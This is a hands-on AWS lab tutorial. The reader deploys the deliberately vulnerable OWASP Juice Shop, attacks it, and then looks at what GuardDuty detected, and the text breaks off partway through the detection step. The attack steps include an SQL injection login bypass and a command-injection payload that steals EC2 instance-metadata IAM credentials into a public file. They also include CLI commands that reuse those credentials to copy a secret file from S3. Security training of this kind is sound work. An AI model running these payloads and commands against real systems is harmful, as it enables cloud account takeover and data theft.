
# Detecting and Responding to Threats in AWS with GuardDuty 


> ### Subtopic: Securing S3 and EC2 Against > Credential Theft & Malware
> **Author:** Felipe Gonzalez  

<img src="Threat Detection with GuardDuty/GuardDuty Findings-1.png" alt="GuardDuty finding example" width="1300">

### Introduction of Tools and concepts

🛡️ Project Overview
This hands-on project immerses you in the dual roles of both an attacker and a defender, giving you a realistic perspective on how cyberattacks unfold against cloud-hosted web applications—and how to detect and respond to them effectively.

By the end, you’ll gain practical experience in discovering and exploiting web vulnerabilities, then pivot into analyzing those threats using Amazon GuardDuty. It's an excellent simulation for professionals in roles such as Security Analyst, Penetration Tester, or Cloud Security Engineer—where understanding exploit techniques, cloud misconfigurations, and detection strategies is critical.

---

### Project Setup
🛠️ Tools and Concepts Explored

### In this project, get ready to...
* Deploy a vulnerable web application (don't worry, it's on purpose)!
* Use hacking techniques to steal credential info.
* Steal sensitive data using stolen credentials.
* Detect and analyze attacks using GuardDuty.
* Implement malware protection to safeguard your data.

<div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
  <img src="Threat Detection with GuardDuty/architecture-complete.png" alt="GuardDuty finding example" width="700">
</div>


#####

 [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/), 

## 📘 Project Overview: 

Before diving into the hands-on activities, it’s important to understand the value of this project and how it connects to real-world cloud security practices.

The web application used in this project is [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) — an intentionally vulnerable e-commerce platform developed by the OWASP Foundation. It’s loaded with real-world security issues from the [**OWASP Top Ten**](https://owasp.org/www-project-top-ten/), such as injection flaws, broken access control, and sensitive data exposure. This makes it an ideal, safe environment for simulating real attacks and learning how to detect and respond to them.

In this project, you’ll step into the shoes of both attacker and defender:
- You'll simulate threats such as **port scanning**, **unauthorized access attempts**, and **IAM credential misuse** — behaviors often seen in real-world breaches.
- Then, using **Amazon GuardDuty**, AWS’s intelligent threat detection service, you’ll observe how these actions are flagged, classified, and prioritized.

### 🔍 What You'll Practice

 - 🛡️ Detect threats like compromised instances, stolen credentials, or malware.

- 🔍 Monitor logs from AWS CloudTrail, VPC Flow Logs, and DNS queries.

- 🚨 Raise security findings with severity levels and detailed context.

- 🧠 Use machine learning, anomaly detection, and threat intelligence to spot unusual activity.

✅ Security Best Practices
Throughout this project, the importance of the principle of least privilege, consistent monitoring, and quick detection became clear. Your next mission: extend these practices organization-wide—enabling GuardDuty by default, reviewing permissions frequently, and validating controls through continuous testing.

#
<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🛍️ Step #1</span>
</div>


### In this step, you're going to:

- Deploy a vulnerable web app using a CloudFormation template  
- Get familiar with the key AWS resources that support your app  
- Prepare to simulate real-world attacks on the app  
- Use GuardDuty to detect and respond to those threats

</div>

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/web deployment process.png" alt="alt text" width="900">
  </div>
</div>

###

###  Deploy the Web App

1. Log in to the AWS Management Console using your **IAM Admin** user.

2. Go to the **CloudFormation** console, and launch the following template:

   👉 [CloudFormation Template]("https://storage.googleapis.com/nextwork_course_resources/courses/aws/AWS%20Project%20People%20projects/Project%3A%20Threat%20Detection%20with%20Amazon%20GuardDuty/nextwork-guardduty-setup.yaml")

3. Before you deploy the resources, make sure to **review your settings** on the final **Review** page.

###
There are 5 items in the Parameters section.

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/parameters-1.png" alt="alt text" width="600">
  </div>
</div>


###

Under Stack failure options, both settings are Activated.

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/stack failure.png" alt="alt text" width="600">
  </div>
</div>


###


###

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/site output-1.png" alt="alt text" width="900">
  </div>
</div>

###
The deployment takes up to 10 minutes, so while we wait, let's explore what we're deploying!




### Breaking Down Your CloudFormation Template

The CloudFormation template you're deploying creates 27 resources that makes up a web app!

This web app is a copy of a very popular web app for security training, called the OWASP Juice Shop.

Once we're done deploying it, it's going to look like this:


###

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/Juice Shop deployed in AWS - architecture view.png" alt="alt text" width="600">
  </div>
</div>



###
https://dlcjrnaymgmey.cloudfront.net/#/
###

> &nbsp; 
> 💡 **What is the OWASP Juice Shop? Why are we using it?**  
> The OWASP Juice Shop is a web application designed for security training. You can check out the official Juice Shop here. What we've deployed is our own copy of it.  
>  
> The OWASP Juice Shop was built with many security flaws on purpose. This lets security engineers practice finding and fixing security problems in a safe environment!  
>  
> *Tip:* OWASP stands for the Open Worldwide Application Security Project. OWASP is a nonprofit online community dedicated to improving software security! They create free resources, and anyone can contribute to an OWASP project (like creating the Juice Shop).
> &nbsp; 


Let's learn how they work together to make up a web app.


<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/site architecture.png" alt="alt text" width="550">
  </div>
</div>


#### 🧱 Breakdown of Deployed Resources

These 27 resources can be grouped into three main categories:

#### 🌐 Web App Infrastructure

- Your web app is hosted on an **EC2 instance**, which acts as the engine running the web app's files.  
  It processes incoming requests and returns responses to users accessing the app.

1.  The **web app files** are stored directly on this EC2 instance, allowing it to serve content directly.

2. The template also creates **custom networking resources**, including:
  - A new **VPC** (Virtual Private Cloud)
  - Subnets, route tables, and gateways  
  This follows AWS best practices, keeping your default VPC untouched and isolating the app’s environment.

3. **CloudFront distribution** is set up to improve speed and performance.  
  Once deployment is complete, your web app will be accessible via a public URL served through CloudFront.


> &nbsp; 
> 💡 **What are the specific networking resources we've deployed?**  
> The networking resources created by this template include:  
> - **VPC**  
> - **Subnets**  
> - **Security group**  
> - **Internet gateway**  
> - **Route tables**  
> - **VPC endpoints**  
> - **Elastic Load Balancer**  
> - **Auto Scaling Group**  
> - **Launch Templates**  
> - **Prefix Lists**
> &nbsp; 

🛡️ GuardDuty for security monitoring

As you might imagine, there are quite a few moving parts in this web app! This means there are lots of opportunity for security vulnerabilities to exist, which means there are lots of ways hackers can get access into your infrastructure.

Because of this, GuardDuty is also in this template and is automatically enabled for monitoring and threat detection.

Later on, after we hack into this web app, we'll jump back into GuardDuty to see whether it's picked up on the incoming threats.



> &nbsp; 
> 💡 **What is GuardDuty? How is it an AI service?**  
>  
> AWS GuardDuty is a threat detection service, which means it helps you find potential security risks or attacks in your apps and AWS environment.  
>  
> It uses machine learning to look for unusual activity in your AWS account, like your network traffic and CloudTrail activity logs. If it finds something suspicious, it will alert you so you can investigate.  
> &nbsp;  


Don't forget, this project is about threat detection with Amazon GuardDuty.

We've deployed the web app with a CloudFormation template (instead of setting it up manually) so we have can start to hack it straight away. This lets you spend more time in GuardDuty and analyze whether it's picked up on your attacks.


#### Validate Your Stack's Deployment

Your stack's status should say CREATE_COMPLETE now

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/create_complete.png" alt="alt text" width="900">
  </div>
</div>


##

<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🔑 Step #2</span>
</div>

##
##
#### Log Into Your Web App

Now that we've deployed our web app, let's try opening it. 
Then, we'll enter 😈 hacker mode 😈 and see whether we can hack our way into the web app's admin portal.

#### In this step, you're going to:

- Open your running web app.
- Use a hacking technique to bypass logging into the admin portal.


<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/Web app location.png" alt="alt text" width="900">
  </div>
</div>


### Locate JuiceShopURL
- In your CloudFormation console, find the JuiceShopURL output for your stack.

- **Right click** on your JuiceShopURL to open it in a new tab.

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/site output-2.png" alt="alt text" width="900">
  </div>
</div>

###



> &nbsp;
💡 Woah! What am I seeing here?
Welcome to the OWASP Juice Shop! This is the web app you've deployed with your CloudFormation template. The web app itself is a juice shop store, where there is a storefront that customers can shop, but also an admin page that requires a login.
>
>As a reminder - the OWASP Juice Shop is a web app designed to help people learn about security risks. It's like a practice website where you can try to find security flaws without causing any real harm. This way, you can learn how to protect real websites from hackers.
> &nbsp;



![alt text](slideshow.gif)

----

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/SQL injection view.png" alt="alt text" width="900">
  </div>
</div>


### SQL Injection

It's time to put on your hacker hat! You've now entered 😈 hacker mode 😈

Pretend that, as a hacker, you've visited the OWASP Juice Shop web app and decided to try steal confidential data.

### Log in to Your Web App

- In the web app's login page, use SQL injection to bypass the login.
- This code gives you a hint on how to do this: ' or 1=1;


<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/SQL injection.png" alt="alt text" width="500">
  </div>
</div>

###

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/SQL Injection Success Attack Attempt.png" alt="alt text" width="700">
  </div>
</div>

<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🤖 Step #3</span>
</div>


### Command Injection (Exploit the Web App)


Having bypassed the login page, we'll stay in 😈 hacker mode 😈 and do our next move - stealing credentials to the web app host's AWS environment!

Yup, you guessed it. You're the web app host, since you're the one that deployed this web app.

### In this step, you're going to:


- Steal AWS credentials.
- Access the stolen credentialS

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/arbitrary code execution.png" alt="alt text" width="900">
  </div>
</div>

###

### Run Malicious Code
- Select the Account option on the top right hand corner.
- Select your admin@juice-sh.op email.

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/run malicious code.png" alt="alt text" width="600">
  </div>
</div>

###



### Conduct command injection using the following code:

Option 1: Markdown ready to copy.

<div style="position: relative; margin: 1em 0;">
  <button onclick="navigator.clipboard.writeText(document.getElementById('code-block').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
  <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px;"><code id="code-block">#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
</code></pre>
</div>

Option 2: Javascript code block: (PDF version)

> &nbsp;
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
> &nbsp;


<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/username location.png" alt="alt text" width="900">
  </div>
</div>

##

> &nbsp;
> 💡 **Why are we entering code in the Username field?**
>
> Imagine asking someone for their name—but instead, they hand you instructions to unlock your phone and give it to them. That's essentially what happens during **command injection** on the admin portal of our web app.
>
> This is a **serious security vulnerability** where the server misinterprets input data as executable commands. The web app expected a username, but instead received a script that steals **IAM credentials** from the EC2 instance it's running on.
>
> 🧨 **Impact:** Attackers can use this technique to access sensitive data, manipulate services, or even gain control over cloud infrastructure.
>
> ---
>
> 💡 **Why does this vulnerability exist?**
>
> The core issue lies in the app’s failure to **sanitize input**. Input sanitization ensures user-submitted data is treated as plain text—not executable code.
>
> Without sanitization, attackers can inject malicious commands, which the server then unknowingly executes.
>
> ---
>
> 💡 **What does this code do?**
> This step demonstrates a real-world **command injection attack** that exploits a vulnerable input field in the web app. By entering malicious code instead of a simple username, attackers can execute unauthorized commands on the EC2 instance behind the application.
> 
> The payload fetches **AWS IAM credentials** from the EC2 metadata service and stores them in a public location.
> 
>
> 
> 1. <code style="color: red;">CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>  
>    This sets up an address pointing to the **EC2 instance metadata service**—a local-only AWS service that contains sensitive info like IAM credentials. By injecting this into the app, you're instructing the EC2 instance to expose its own secrets.
> 
> 2. <code style="color: red;">TOKEN=\curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"</code>  
>    This line retrieves a **session token** to access the metadata service. The token acts as temporary authorization for the next call, simulating the app’s internal process.
> 
> 3. <code style="color: red;">CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN")</code>  
>    This powerful line chains multiple commands to request IAM credentials from the EC2 metadata service and format them. It impersonates legitimate access using the token, then fetches each credential path individually.
> 
> 4. <code style="color: red;">echo $CRED | json_pp &gt;frontend/dist/frontend/assets/public/credentials.json</code>  
>    The output (the credentials) is saved into a publicly accessible file in the web server’s asset folder. **Anyone visiting the site can now access sensitive AWS credentials**—a massive security breach.
> 
> ---
> 
> 🔗 Bonus: Want to understand this better? Visit the [EC2 Instance Metadata documentation](<span style="color:red">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</span>).
> &nbsp;

###

- Check if the profile's username changes to [object Object] once you submit the code.


<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/command injection profile view.png" alt="alt text" width="500">
  </div>
</div>

###

🙋‍♀️ My username says something completely different

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/chnaged on username.png" alt="alt text" width="900">
  </div>
</div>

###

- Make sure you've run the script in the Username field correctly with no typos!

> &nbsp;
> 💡 **Why is the username showing `[object Object]`?**
>
> This is a classic result of a **command injection vulnerability**. In this scenario, you injected a script into the **Username** field. The web server didn’t sanitize the input and treated it as valid code to execute.
>
> Normally, the username should display a simple string. But instead, it’s showing **`[object Object]`**, which is how JavaScript represents a full object when it’s coerced into a string.
>
> In other words, your script created a new JavaScript object (the **IAM credentials**) and when the app tried to display it as text—it just showed `[object Object]`.
>
> This confirms that the injected code worked, and the server responded by storing the AWS credentials in a JSON object, as instructed.
> &nbsp;

### View the stolen credentials.

💡 Where can I find the stolen credentials?
- Hint: The command injection you ran placed the stolen credentials into a file that’s easy to access. The path to the file is referenced in your code!

- If you're still stuck, refer to the screenshot (and note the URL).


### Actually let me show you!
> &nbsp;
> 🔗 **Where did this CloudFront link come from?**
>  
> You didn't explicitly include the full CloudFront URL in your command injection. However, the connection looks like this:
>
> 1. Your command injects this line into the server:
>
> ```bash
> echo $CRED | json_pp > frontend/dist/frontend/assets/public/credentials.json
> ```
>
> This writes the **stolen IAM credentials** to a file in the local file system of the Juice Shop app.
>
> 2. Juice Shop is most likely being served through **CloudFront** as a static web app. This means:  
> - The `frontend/dist/frontend` directory is **publicly served** as part of the web app. **CloudFront acts as the CDN/front-door** to the web content.
>
> 3. That’s why you can access this file at:
>
> ```ruby
> https://dlcjrnaymgmey.cloudfront.net/assets/public/credentials.json
> ```
>
> This URL corresponds to:  
> `/frontend/dist/frontend/assets/public/credentials.json`  
> Because that’s where the file was written during the injection.
>
> 🧭 **In short:**  
> - Your command injection **didn’t include** the CloudFront URL directly.  
> - But it **wrote the file** to a location that is **exposed** via your app's CloudFront-distributed frontend.  
> - CloudFront is just the **public-facing entry point** that makes that path available over HTTPS.
> &nbsp;

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/credential JSON file.png" alt="alt text" width="1500">
  </div>
</div>

#
> ## 🔍 What is each line saying?
> The JSON credential file contains information about your AWS access credentials:
>
> - **AccessKeyId** and **SecretAccessKey** are your main keys for accessing AWS services.
> - **Token** adds extra security to your session and is used with your access keys.
> - **Expiration** tells you when your credentials will stop working.
> - **Code** and **Type** show the status and type of your credentials.
> &nbsp;


<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🕵️‍♂️ Step #4</span>
</div>

## Investigating Insider Threat Tactics


💥 **Time for the final move: Data Exfiltration!**

Now that you've captured the stolen credentials, it’s time to stay in full 😈 *hacker mode* 😈 and pull off one last trick—stealing sensitive data stored in the victim’s AWS environment!

You’ll use **AWS CloudShell** to simulate the attacker, leveraging the stolen IAM credentials to run commands that access the web app host’s **S3 bucket**. These credentials have enough permissions to read private files, so in just a few steps, you’ll have access to secret data stored in the cloud.

> &nbsp;
> 🛡️ **Wait... am I actually hacking something real?**  
> Don’t worry—this is all happening in a safe, self-contained environment. You’re the one who deployed this web app using CloudFormation back in Step 1. That means the S3 bucket and all the resources belong to your own AWS account.
>
> This simulation is designed for learning purposes only. You’re not accessing anyone else’s data but just the data already deployed to the ***OWASP Juice Shop.***
> &nbsp;

## In this step, you're going to:

- Open AWS CloudShell.
- Configure AWS CLI with the stolen credentials.
- Copy the secret file from the S3 bucket.

<div style="text-align: center;">
  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block;">
    <img src="Threat Detection with GuardDuty/Steal data.png" alt="alt text" width="10000">
  </div>
</div>

##
##### 1. Open the CloudShell console.

> &nbsp;
> 💡 **How can I simulate a hacker and "steal data" in my own AWS account?**  
>  
> Since you're both the app owner and the attacker in this project, simulating an outsider is tricky.  
>  
> The solution? Use **AWS CloudShell**. CloudShell runs under a temporary AWS account ID, different from your own. So when you use stolen EC2 credentials inside CloudShell, it appears as if a *different* account is accessing your environment—just like a real attacker.  
>  
> This behavior is suspicious, and **GuardDuty will flag it.**  
>  
> **Why doesn't GuardDuty flag my regular CloudShell use?**  
> Because normally you're using your IAM user's permissions. In this simulation, you're using stolen credentials to access EC2 resources—behavior that breaks the norm and triggers GuardDuty.
> &nbsp;

##### 2. Save an environment variable for the Juice Shop URL.

<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">
  <h3>📦 Set Your S3 Bucket Environment Variable</h3>

  <img src="Threat Detection with GuardDuty/setting enviroment variable.png" alt="S3 Bucket Variable" style="max-width: 100%; border-radius: 4px; margin-bottom: 12px;" />

  <p><strong>💡 Why this matters:</strong> Environment variables make your commands cleaner and reusable. In this case, you’ll store the name of the S3 bucket that holds sensitive app data.</p>

  <p><strong>Set the <code>JUICESHOP3BUCKET</code> variable</strong> to point to your vulnerable web app’s secure S3 bucket. This will let you easily refer to the bucket in upcoming commands without retyping its full name.</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-bucket').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-bucket">export JUICESHOP3BUCKET=vulnerablewebapp-thesecurebucket-qu2vniy4nr6f</code></pre>
  </div>

  <p><strong>✅ Reminder:</strong> Replace the example bucket name above with the actual bucket from your own deployment (found in the S3 console or output tab of your CloudFormation stack).</p>
</div>


##
##### 3. Prepare Your S3 Bucket Variable for Credential Exfiltration
###

<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">
  <h3>📦 Set the  <code>JUICESHOP3BUCKET</code> Environment Variable</h3>

  <p>🔍 In your environment, the S3 bucket name can be found in the S3 bucket list or the ARN. Check the example below:</p>

  <img src="Threat Detection with GuardDuty/S3 ARN.png" alt="S3 ARN example" style="max-width: 100%; border-radius: 4px; margin-bottom: 12px;" />

  <img src="Threat Detection with GuardDuty/S3 bucket variable.png" alt="S3 bucket variable highlighted" style="max-width: 100%; border-radius: 4px; margin-bottom: 12px;" />

  <p><strong>💡 Tip:</strong> Setting this variable helps you reuse the bucket name easily in future commands.</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-3').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-3">export JUICESHOP3BUCKET=vulnerablewebapp-thesecurebucket-qu2vniy4nr6f</code></pre>
  </div>
</div>


##
##### 4. Download and Display Credentials
###

<!-- sample code of good block 1 -->

<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">
  <h4>🕵️‍♂️ Extract and View Stolen IAM Credentials</h4>

  <img src="Threat Detection with GuardDuty/download credentials.png" alt="Download credentials" style="max-width: 100%; border-radius: 4px; margin-bottom: 12px;" />

  <p><strong>💡 Note:</strong> Use the <code>JUICESHOPURL</code> variable to simplify the command.</p>

  <p><strong>Task 1:</strong> Download the stolen credentials into your CloudShell session:</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-2').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-2">wget ${JUICESHOPURL}/assets/public/credentials.json</code></pre>
  </div>

  <p><strong>Task 2:</strong> Display the contents of the file using <code>cat</code>:</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-3').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-3">cat credentials.json</code></pre>
  </div>

You should see what's inside the credentials.json file, which are the credentials we stole through the web app!

  <img src="Threat Detection with GuardDuty/credentials.png" alt="Displayed credentials" style="max-width: 100%; border-radius: 4px; margin-top: 16px;" />
</div>

<!-- sample code of good block 1 -->



### Configure to reveal

<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">
  <h4>🔐 Configure AWS CLI Profile: <code>stolen</code></h4>

  <p><strong>💡 What is an AWS CLI profile?</strong><br>
  An AWS CLI profile stores credentials and settings to authenticate and access AWS services. Each profile includes your access key, secret key, session token (if applicable), and region. Profiles help isolate environments or simulate different user access levels.</p>

  <p><strong>💡 Why create a new profile?</strong><br>
  In this case, we’re setting up a new profile named <code>stolen</code> using credentials extracted from the vulnerable web app. This simulates how an attacker might use exposed credentials from another environment.</p>

  <img src="Threat Detection with GuardDuty/configure CLI profile.png" alt="Configure CLI Profile" style="max-width: 120%; border-radius: 4px; margin: 16px 0;" />

  <p>Use the commands below to configure the profile:</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-stolen').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-stolen">aws configure set profile.stolen.region us-east-1
aws configure set profile.stolen.aws_access_key_id $(cat credentials.json | jq -r '.AccessKeyId')
aws configure set profile.stolen.aws_secret_access_key $(cat credentials.json | jq -r '.SecretAccessKey')
aws configure set profile.stolen.aws_session_token $(cat credentials.json | jq -r '.Token')</code></pre>
  </div>

  <p>✅ Once set, use the <code>--profile stolen</code> flag in your AWS CLI commands to act as the attacker using those credentials.</p>

  <p style="margin-top: 16px; font-weight: bold; color: #d9534f;">🚨 Note: Make sure your AWS CloudShell terminal session stays open for the rest of this step, as we will reuse these credentials later!</p>
</div>


## View the Stolen Document

<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">
  <h4>🕵️ Final Move: Reveal Secret Information</h4>

  <p><strong>Copy the Secret File</strong><br>
  Using the stolen credentials, copy the <code>secret-information.txt</code> file from the S3 bucket using the following command:</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-copy').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-copy">aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen</code></pre>
  </div>

  <p><strong>View the Secret File</strong><br>
  Display the contents of the file using:</p>

  <div style="position: relative; margin-top: 1em;">
    <button onclick="navigator.clipboard.writeText(document.getElementById('code-block-cat').innerText)" style="position: absolute; top: 8px; right: 8px; padding: 4px 10px; background-color: #f4a261; border: none; border-radius: 4px; cursor: pointer;">📋 Copy</button>
    <pre style="overflow-x: auto; background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; margin-top: 0;">
<code id="code-block-cat">cat secret-information.txt</code></pre>
  </div>

  <p>📄 You should see a line that reads:<br>
  <em>"Dang it - if you can see this text, you're accessing our private information!"</em></p>

  <img src="Threat Detection with GuardDuty/final move.png" alt="View Secret Information" style="max-width: 100%; border-radius: 4px; margin-top: 16px;" />
</div>


<div style="border: 2px solid #ef476f; padding: 20px; border-radius: 8px; background: #fff0f3; margin-top: 20px;">
  <h3>🎬 Mission Recap: The Hacker’s Journey</h3>

  <p>Here's what you pulled off in this full-scale cloud security simulation:</p>

  <ul>
    <li>🧃 Infiltrated the vulnerable <strong>Juice Shop web app</strong>.</li>
    <li>🕳️ Exploited a <strong>SQL injection</strong> to bypass authentication on the admin portal.</li>
    <li>💣 Launched a <strong>command injection attack</strong> that forced the EC2 instance to leak its IAM credentials into a publicly accessible location.</li>
    <li>🌐 Navigated to the leaked credentials URL and <strong>exfiltrated sensitive IAM data</strong>.</li>
    <li>💻 Used AWS CloudShell to <strong>download and parse the credentials</strong> into a new CLI profile.</li>
    <li>🛠️ Created a new AWS CLI profile (<code>stolen</code>) and used it to impersonate the EC2 instance.</li>
    <li>📦 Gained unauthorized access to an S3 bucket using the stolen role’s permissions.</li>
    <li>📄 Successfully accessed and revealed the contents of a secret file meant to be private.</li>
  </ul>

  <p><strong>🎯 Outcome:</strong> You’ve completed a full-cycle cloud credential exfiltration and data breach simulation—demonstrating how vulnerable applications can expose entire cloud environments when left unprotected.</p>

  <p style="margin-top: 12px;"><strong>🔐 Now it's time to switch hats—</strong> from attacker back to defender, and see if <strong>Amazon GuardDuty</strong> caught your moves...</p>
</div>


<!-- Step #4: Detection and Defense -->

<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🛡️ Step #4 </span>
</div>

#
### Security Detection Phase
#

#### 🛡️ Switch to Defender Mode – Detect the Attack with GuardDuty

The attack on your web app is complete — you've explored how vulnerabilities can be exploited. Now it’s time to flip the script.

As the engineer who deployed this web app, you're stepping out of hacker mode and into your role as a defender. Your mission now is to investigate whether **Amazon GuardDuty** detected the suspicious activity triggered during the attack.

### In this stage, you'll:

- Access the GuardDuty console  
- Locate any security findings  
- Analyze what GuardDuty detected and how it responded

![alt text](<Detect with Guardduty.png>)


#### Locate GuardDuty's Findings


<div style="border: 1px solid #ddd; padding: 16px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">

#### Here we can verify that the GuardDuty dashboard has picked up on 2 High findings from the same source.


  <img src="Threat Detection with GuardDuty/GuardDuty Findings-2.png" alt="GuardDuty Alert Screenshot" style="max-width: 100%; border-radius: 4px; margin-bottom: 16px;" />

  <h3>🛡️ GuardDuty Finding: EC2 Credential Misuse</h3>
  <p>GuardDuty successfully detected that the EC2 instance role <code>vulnerablewebapp-TheRole-6yiHfFZ30fjZ</code> was used by another AWS account—proof that our credential exfiltration attack worked.</p>

  <img src="Threat Detection with GuardDuty/incident details.png" alt="Incident Detail Screenshot" style="max-width: 100%; border-radius: 4px; margin: 20px 0;" />

  <h4>📌 Key Details:</h4>
  <ul style="line-height: 1.6;">
